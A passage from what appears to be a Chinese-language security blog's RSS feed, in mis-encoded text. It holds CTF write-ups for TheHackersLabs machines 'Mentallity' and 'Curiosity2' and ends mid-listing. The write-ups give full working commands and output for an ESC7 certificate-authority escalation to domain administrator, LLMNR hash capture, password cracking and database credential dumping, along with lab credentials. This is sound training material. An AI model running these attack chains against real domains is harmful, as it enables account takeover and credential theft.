SMB         192.168.56.28   445    WIN-9FQTT7GPAVK  [-] mentality.thl\anonymous: STATUS_LOGON_FAILURE
```

FTP åŒ¿åæµ‹è¯•

```bash
âœ  Mentallity ftp 192.168.56.28                      
Connected to 192.168.56.28.
220 Microsoft FTP Service
Name (192.168.56.28:root): anonymous
331 Password required
Password: 
530 User cannot log in.
ftp: Login failed
```

### HTTP

HTTP - 80

![image.png](/post-images/TheHackersLabsMentallity/image1.png)

```bash
âœ  Mentallity feroxbuster --url http://192.168.56.28 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x asp,php,txt,zip

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ğŸ¤“                 ver: 2.11.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ http://192.168.56.28
 ğŸš€  Threads               â”‚ 50
 ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 ğŸ’¢  Status Code Filters   â”‚ [404, 503, 400]
 ğŸ’¥  Timeout (secs)        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ”  Extract Links         â”‚ true
 ğŸ’²  Extensions            â”‚ [asp, php, txt, zip]
 ğŸ  HTTP methods          â”‚ [GET]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      334l     2089w   180418c http://192.168.56.28/iisstart.png
200      GET       32l       55w      703c http://192.168.56.28/
[####################] - 2m   1038160/1038160 0s      found:2       errors:0
[####################] - 2m   1038145/1038145 10180/s http://192.168.56.28/
```

HTTP - 8080

![image.png](/post-images/TheHackersLabsMentallity/image2.png)

å‘ç°ä¸€ä¸ªç™»å½•é¡µé¢

![image.png](/post-images/TheHackersLabsMentallity/image3.png)

æˆ‘ä»¬ç‚¹å‡»ç™»å½•çš„æ—¶å€™å‘ç°å¾ˆå¥‡æ€ªï¼Œå› ä¸ºå¹¶æ²¡æœ‰æäº¤æ•°æ®

ç„¶åå¯ä»¥æ³¨æ„åˆ°åªåŠ è½½äº†ä¸€ä¸ª `JS` è„šæœ¬

![image.png](/post-images/TheHackersLabsMentallity/image4.png)

è„šæœ¬å†…å®¹

```bash
function validateForm() {
    const u = document.getElementById("username").value;
    const p = document.getElementById("password").value;
    const errorMessage = document.getElementById("errorMessage");

    if (u === "admin" && p === "adminpass123") {
        window.location.href = "dashboard.html";
        return false;
    }
    errorMessage.textContent = "Invalid Username Or Password!";
    return false;
}
```

æˆ‘ä»¬ç›´æ¥è½¬åˆ° `ashboard.html`

![image.png](/post-images/TheHackersLabsMentallity/image5.png)

å¾—åˆ°ä¸€ä¸² `BASE64` ç¼–ç åçš„å­—ç¬¦ä¸²ï¼Œè§£å¯†åå¾—åˆ° `FTP`çš„è´¦æˆ·

![image.png](/post-images/TheHackersLabsMentallity/image6.png)

å‘ç°é‡Œé¢æœ‰ä¸‰ä¸ªæ–‡ä»¶

```bash
âœ  Mentallity ftp 192.168.56.28
Connected to 192.168.56.28.
220 Microsoft FTP Service
Name (192.168.56.28:root): ftpuser 
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||54349|)
125 Data connection already open; Transfer starting.
07-17-25  08:52AM              1608612 ad_hc_mentality_htl.html
07-17-25  05:48AM                   34 flag.txt
07-17-25  12:13AM                   75 web.config
226 Transfer complete.
ftp> 
```

å…¶ä¸­è¿™ä¸ªå°±æ˜¯ `user.txt`

```bash
âœ  Mentallity cat flag.txt      
FLAG{thisxxxxxxxxxxxxxxxxxxxxxx
```

å¦å¤–ä¸€ä¸ª `HTML` æ–‡ä»¶æ˜¯å®‰å…¨åˆ†æç»“æœï¼Œæ˜¯å…³äºåŸŸçš„

![image.png](/post-images/TheHackersLabsMentallity/image7.png)

åœ¨æŠ¥å‘Šä¸­èƒ½å¾—åˆ°ä¸€ä¸ªå‡­æ® `svcapp1`:`Hola1234$` ï¼Œå¹¶ä¸”ä¹ŸçŸ¥é“äº† `ftpuser` ä¹Ÿæ˜¯å¯ä»¥åœ¨åŸŸä¸­è¿›è¡Œè®¤è¯çš„

![image.png](/post-images/TheHackersLabsMentallity/image8.png)

æµ‹è¯•å‡­æ®

```bash
âœ  Mentallity nxc smb 192.168.56.28 -u 'svcapp1' -p 'Hola1234$' --smb-timeout 9999                  
SMB         192.168.56.28   445    WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.28   445    WIN-9FQTT7GPAVK  [+] mentality.thl\svcapp1:Hola1234$

âœ  Mentallity nxc ldap 192.168.56.28 -u 'svcapp1' -p 'Hola1234$'               
LDAP        192.168.56.28   389    WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl)
LDAPS       192.168.56.28   636    WIN-9FQTT7GPAVK  [+] mentality.thl\svcapp1:Hola1234$
 
âœ  Mentallity nxc winrm 192.168.56.28 -u 'svcapp1' -p 'Hola1234$'
WINRM       192.168.56.28   5985   WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.56.28   5985   WIN-9FQTT7GPAVK  [-] mentality.thl\svcapp1:Hola1234$ 
```

`SMB` æ–‡ä»¶åˆ—è¡¨

```bash
âœ  192.168.56.28 tree
.
â””â”€â”€ SYSVOL
    â””â”€â”€ mentality.thl
        â””â”€â”€ Policies
            â”œâ”€â”€ {31B2F340-016D-11D2-945F-00C04FB984F9}
            â”‚   â”œâ”€â”€ GPT.INI
            â”‚   â””â”€â”€ MACHINE
            â”‚       â”œâ”€â”€ Microsoft
            â”‚       â”‚   â””â”€â”€ Windows NT
            â”‚       â”‚       â””â”€â”€ SecEdit
            â”‚       â”‚           â””â”€â”€ GptTmpl.inf
            â”‚       â””â”€â”€ Registry.pol
            â””â”€â”€ {6AC1786C-016F-11D2-945F-00C04fB984F9}
                â”œâ”€â”€ GPT.INI
                â””â”€â”€ MACHINE
                    â””â”€â”€ Microsoft
                        â””â”€â”€ Windows NT
                            â””â”€â”€ SecEdit
                                â””â”€â”€ GptTmpl.inf
```

## åŸŸåˆ†æ

æ”¶é›†ä¿¡æ¯

```bash
âœ  Mentallity bloodhound-python -d 'mentality.thl' -ns 192.168.56.28 --zip -c All -dc 'WIN-9FQTT7GPAVK.mentality.thl' -u svcapp1 -p 'Hola1234$'                                                
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: mentality.thl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: WIN-9FQTT7GPAVK.mentality.thl
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: WIN-9FQTT7GPAVK.mentality.thl
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 6 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WIN-9FQTT7GPAVK.mentality.thl
INFO: Done in 00M 01S
INFO: Compressing output into 20250723214935_bloodhound.zip
```

ç”¨æˆ·ç»„

![image.png](/post-images/TheHackersLabsMentallity/image9.png)

ç¿»äº†åŠå¤©å¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„

## ESC 7

ä½¿ç”¨ `certipy-ad` æšä¸¾ä¸€ä¸‹è¯ä¹¦æ¼æ´

```bash
âœ  Mentallity certipy-ad -debug find -dc-ip 192.168.56.28 -u svcapp1 -p Hola1234$ -vulnerable -text -target WIN-9FQTT7GPAVK.mentality.thl  
```

å‘ç° `ESC 7`

```bash
âœ  Mentallity cat 20250723221243_Certipy.txt 
Certificate Authorities
  0
    CA Name                             : mentality-WIN-9FQTT7GPAVK-CA
    DNS Name                            : WIN-9FQTT7GPAVK.mentality.thl
    Certificate Subject                 : CN=mentality-WIN-9FQTT7GPAVK-CA, DC=mentality, DC=thl
    Certificate Serial Number           : 52F256456C27B2834A8DCCF7EE745646
    Certificate Validity Start          : 2025-07-17 13:46:02+00:00
    Certificate Validity End            : 2045-07-17 13:56:02+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : MENTALITY.THL\Administrators
      Access Rights
        Enroll                          : MENTALITY.THL\Authenticated Users
                                          MENTALITY.THL\svcapp1
        ManageCa                        : MENTALITY.THL\svcapp1
                                          MENTALITY.THL\Domain Admins
                                          MENTALITY.THL\Enterprise Admins
                                          MENTALITY.THL\Administrators
        ManageCertificates              : MENTALITY.THL\Domain Admins
                                          MENTALITY.THL\Enterprise Admins
                                          MENTALITY.THL\Administrators
    [+] User Enrollable Principals      : MENTALITY.THL\Authenticated Users
                                          MENTALITY.THL\svcapp1
    [+] User ACL Principals             : MENTALITY.THL\svcapp1
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates                   : [!] Could not find any certificate templates
```

è·Ÿç€æ–‡æ¡£æ‰“å³å¯

æ–‡æ¡£é“¾æ¥ï¼šhttps://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca

```bash
âœ  Mentallity certipy-ad ca \
    -u 'svcapp1@mentality.thl' -p 'Hola1234$' \
    -ns '192.168.56.28' -target 'WIN-9FQTT7GPAVK.mentality.thl' \
    -ca 'mentality-WIN-9FQTT7GPAVK-CA' -add-officer 'svcapp1'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'svcapp1' on 'mentality-WIN-9FQTT7GPAVK-CA'
```

```bash
âœ  Mentallity certipy ca \
    -u 'svcapp1@mentality.thl' -p 'Hola1234$' \
    -ns '192.168.56.28' -target 'WIN-9FQTT7GPAVK.mentality.thl' \
    -ca 'mentality-WIN-9FQTT7GPAVK-CA' -enable-template 'SubCA'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'mentality-WIN-9FQTT7GPAVK-CA'
```

```bash
âœ  Mentallity certipy req \
    -u 'svcapp1@mentality.thl' -p 'Hola1234$' \
    -ns '192.168.56.28' -target 'WIN-9FQTT7GPAVK.mentality.thl' \
    -ca 'mentality-WIN-9FQTT7GPAVK-CA' -template 'SubCA' \
    -upn 'administrator@mentality.thl' -sid 'S-1-5-21-1896710242-59548724-504912181-500'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '5.key'
[*] Wrote private key to '5.key'
[-] Failed to request certificate
```

```bash
âœ  Mentallity certipy ca \
    -u 'svcapp1@mentality.thl' -p 'Hola1234$' \
    -ns '192.168.56.28' -target 'WIN-9FQTT7GPAVK.mentality.thl' \
    -ca 'mentality-WIN-9FQTT7GPAVK-CA' -issue-request '5'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate request ID 5
```

```bash
âœ  Mentallity certipy req \
    -u 'svcapp1@mentality.thl' -p 'Hola1234$' \
    -ns '192.168.56.28' -target 'WIN-9FQTT7GPAVK.mentality.thl' \
    -ca 'mentality-WIN-9FQTT7GPAVK-CA' -retrieve '5'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Retrieving certificate with ID 5
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@mentality.thl'
[*] Certificate object SID is 'S-1-5-21-1896710242-59548724-504912181-500'
[*] Loaded private key from '5.key'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

è·å– `HASH`

```bash
âœ  Mentallity certipy-ad auth -pfx 'administrator.pfx' -domain "mentality.thl" -dc-ip 192.168.56.28
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@mentality.thl'
[*]     SAN URL SID: 'S-1-5-21-1896710242-59548724-504912181-500'
[*]     Security Extension SID: 'S-1-5-21-1896710242-59548724-504912181-500'
[*] Using principal: 'administrator@mentality.thl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@mentality.thl': aad3b435b51404xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxd04a6bd959f95ce2b2
```

è¯»å– `root.txt`

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat root_flag.txt
4042xxxxxxxxxxxxxxxxxxxxxx
```

## æ€»ç»“

ä¸éš¾ï¼Œä½†æ˜¯å·®ä¸€ç‚¹ç‚¹å°±é¦–æ€äº†ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼

å°±äº”åˆ†é’Ÿï¼ï¼]]></content:encoded>
            <category>é¶æœº</category>
            <category>TheHackersLabs</category>
            <category>Windows</category>
            <category>AD</category>
            <category>ESC7</category>
            <category>FTP</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Curiosity2]]></title>
            <link>https://www.sunsetaction.top/2025/07/19/TheHackersLabsCuriosity2</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/19/TheHackersLabsCuriosity2</guid>
            <pubDate>Sat, 19 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Curiosity2 https://labs.thehackerslabs.com/machine/103 Recon PortScan nmap ç«¯å£æ‰«æ æšä¸¾æµ‹è¯• æµ‹è¯• SMB åŒ¿åè´¦æˆ· å†çœ‹ä¸€çœ¼ wireshark ï¼Œä¾æ—§æœ‰ LLMNRåŒ…ï¼Œå¹¶ä¸”ä»æ•°æ®åŒ…å¯ä»¥çœ‹å‡ºæ¥æ˜¯åœ¨æŸ¥è¯¢ SQLserver ...]]></description>
            <content:encoded><![CDATA[
# Curiosity2

> https://labs.thehackerslabs.com/machine/103
> 

![image.png](/post-images/TheHackersLabsCuriosity2/image.png)

## Recon

### PortScan

`nmap` ç«¯å£æ‰«æ

```bash
âœ  Curiosity2 nmap -sT -min-rate 10000 -p- 192.168.56.116 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 19:40 CST
Warning: 192.168.56.116 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.56.116
Host is up (0.00030s latency).
Not shown: 64872 closed tcp ports (conn-refused), 638 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49684/tcp open  unknown
49685/tcp open  unknown
49689/tcp open  unknown
49693/tcp open  unknown
49704/tcp open  unknown
57936/tcp open  unknown
60031/tcp open  unknown
MAC Address: 08:00:27:06:86:F8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

```bash
âœ  Curiosity2 nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.56.116
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 19:41 CST
Nmap scan report for 192.168.56.116
Host is up (0.00086s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-19 11:41:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
|_ssl-date: 2025-07-19T11:42:41+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
|_ssl-date: 2025-07-19T11:42:41+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
|_ssl-date: 2025-07-19T11:42:41+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
|_ssl-date: 2025-07-19T11:42:41+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
57936/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   192.168.56.116\SQLEXPRESS:
|     Instance name: SQLEXPRESS
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 57936
|_    Clustered: false
|_ssl-date: 2025-07-19T11:42:41+00:00; 0s from scanner time.
| ms-sql-ntlm-info:
|   192.168.56.116\SQLEXPRESS:
|     Target_Name: CONS
|     NetBIOS_Domain_Name: CONS
|     NetBIOS_Computer_Name: WIN-C73PROQLRHL
|     DNS_Domain_Name: cons.thl
|     DNS_Computer_Name: WIN-C73PROQLRHL.cons.thl
|_    Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
60031/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:06:86:F8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2016|2019
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2016 or Server 2019
Network Distance: 1 hop
Service Info: Host: WIN-C73PROQLRHL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-07-19T11:42:32
|_  start_date: 2025-07-19T18:29:12
|_nbstat: NetBIOS name: WIN-C73PROQLRHL, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:06:86:f8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE
HOP RTT     ADDRESS
1   0.86 ms 192.168.56.116

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.59 seconds
```

### æšä¸¾æµ‹è¯•

æµ‹è¯• `SMB` åŒ¿åè´¦æˆ·

```bash
âœ  Curiosity2 nxc smb cons.thl -u anonymous -p ''                                                             
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [-] cons.thl\anonymous: STATUS_LOGON_FAILURE 
```

å†çœ‹ä¸€çœ¼ `wireshark` ï¼Œä¾æ—§æœ‰ `LLMNR`åŒ…ï¼Œå¹¶ä¸”ä»æ•°æ®åŒ…å¯ä»¥çœ‹å‡ºæ¥æ˜¯åœ¨æŸ¥è¯¢ `SQLserver`

![image.png](/post-images/TheHackersLabsCuriosity2/image1.png)

### Responder

æˆ‘ä»¬å¼€å¯ `Responder` ä¸ä¸€ä¼šå°±å°±èƒ½æŠ“åˆ° `HASH`

![image.png](/post-images/TheHackersLabsCuriosity2/image2.png)

å¼€å±€çš„æ€è·¯å’Œ`Curiosity`å·®ä¸å¤š

æˆ‘ä»¬å°è¯•å°†`HASH`è¿›è¡Œçˆ†ç ´

```bash
hashcat -m 5600 hash /usr/share/seclists/Passwords/seasons.txt
```

å¾—åˆ°å¯†ç `au7umn@`

![image.png](/post-images/TheHackersLabsCuriosity2/image3.png)

æµ‹è¯•å‡­æ®

```bash
âœ  Curiosity2 nxc smb cons.thl -u sqldb -p 'au7umn@'
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\sqldb:au7umn@ 

âœ  Curiosity2 nxc ldap cons.thl -u sqldb -p 'au7umn@'
LDAP        192.168.56.116  389    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)
LDAP        192.168.56.116  389    WIN-C73PROQLRHL  [+] cons.thl\sqldb:au7umn@ 

âœ  Curiosity2 nxc winrm cons.thl -u sqldb -p 'au7umn@'
WINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [+] cons.thl\sqldb:au7umn@ (Pwn3d!)
```

## è„±åº“

æ ¹æ®ç”¨æˆ·åï¼Œè¯¥ç”¨æˆ·åº”è¯¥æ˜¯å¯¹æ•°æ®åº“æœ‰ä¸€å®šæƒé™

```bash
*Evil-WinRM* PS C:\Users\sqldb\DEsktop> sqlcmd -S "localhost\SQLEXPRESS" -Q "SELECT @@VERSION"

------------------------------------------------------------------------------
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 <X64> (Build 14393: ) (Hypervisor)

(1 rows affected)

*Evil-WinRM* PS C:\Users\sqldb\DEsktop> sqlcmd -S "localhost\SQLEXPRESS" -Q "SELECT name FROM sys.databases"
name
--------------------------------------------------------------------------------------------------------------------------------
master
tempdb
model
msdb
CredentialsDB
toolsdb

(6 rows affected)

*Evil-WinRM* PS C:\Users\sqldb\DEsktop> sqlcmd -S "localhost\SQLEXPRESS" -Q "USE CredentialsDB;SELECT name FROM sys.tables"
Changed database context to 'CredentialsDB'.
name
--------------------------------------------------------------------------------------------------------------------------------
Credentials

(1 rows affected)

*Evil-WinRM* PS C:\Users\sqldb\DEsktop> sqlcmd -S "localhost\SQLEXPRESS" -Q "USE CredentialsDB;SELECT * FROM Credentials"
Changed database context to 'CredentialsDB'.
ID          Username                                           Password
----------- -------------------------------------------------- -------------------------------------------------------------
          1 sqlsvc                                             a6d888301de7aa3b380a691d32837627

(1 rows affected)

*Evil-WinRM* PS C:\Users\sqldb\DEsktop> sqlcmd -S "localhost\SQLEXPRESS" -Q "USE toolsdb;SELECT name FROM sys.tables"
Msg 916, Level 14, State 2, Server WIN-C73PROQLRHL\SQLEXPRESS, Line 1
The server principal "CONS\sqldb" is not able to access the database "toolsdb" under the current security context.
```

æ‹¿åˆ° `sqlsvc` çš„å¯†ç `MD5`å€¼ï¼Œæ‹¿å»ç ´è§£ï¼Œè¿˜å¯ä»¥å‘ç°

å¾—åˆ°å¯†ç  `$PRING2021#`

```bash
âœ  Curiosity2 john --wordlist=/usr/share/seclists/Passwords/seasons.txt --format=Raw-MD5 hash
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
$PRING2021#      (?)     
1g 0:00:00:00 DONE (2025-07-19 20:11) 50.00g/s 19200p/s 19200c/s 19200C/s $pr1ng..$umm3r2021%
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

æµ‹è¯•`sqlsvc`çš„å‡­æ®

```bash
âœ  Curiosity2 nxc winrm cons.thl -u sqlsvc -p '$PRING2021#'
WINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [+] cons.thl\sqlsvc:$PRING2021# (Pwn3d!)
âœ  Curiosity2 nxc ldap cons.thl -u sqlsvc -p '$PRING2021#'
LDAP        192.168.56.116  389    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)
LDAP        192.168.56.116  389    WIN-C73PROQLRHL  [+] cons.thl\sqlsvc:$PRING2021# 
âœ  Curiosity2 nxc smb cons.thl -u sqlsvc -p '$PRING2021#'
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) 
SMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\sqlsvc:$PRING2021#
```

## KeePass - 1

ä½¿ç”¨`WinRM`ç™»é™†ä¸Šå»åï¼Œç›®å½•ä¸­æœ‰ä¸€ä¸ª`Database.kdbx`

æ˜¯`KeePass`çš„æ–‡ä»¶

```bash
*Evil-WinRM* PS C:\Users\sqlsvc\Documents> ls

    Directory: C:\Users\sqlsvc\Documents

Mode                LastWriteTime         Length Name
